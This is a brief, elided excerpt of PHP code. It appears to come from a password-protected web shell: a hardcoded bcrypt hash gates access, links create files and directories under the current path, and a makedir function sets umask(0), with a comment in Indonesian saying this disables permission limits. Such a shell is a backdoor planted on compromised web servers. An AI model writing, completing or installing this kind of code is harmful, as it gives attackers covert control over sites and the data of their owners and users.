...
$whoitsme = '$2y$10$cLR7dHkVrRLv4PEJmZvou.gSz6o7zKqAQcxuP96oH8xqslhNfKAWq';

if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], $whoitsme)) {
    ...
    <tr>
    	<td colspan="5" class="not">
    		<center>
                ...
                <a class="tool" href="?path=<?=cwd()?>&makefile">MAKE FILE</a>
                <a class="tool" href="?path=<?=cwd()?>&makedir">MAKE DIR</a>
    		</center>
    	</td>
    </tr>
    <tr>
...
function makedir($dirname) {
    umask(0); // Menonaktifkan batasan umask
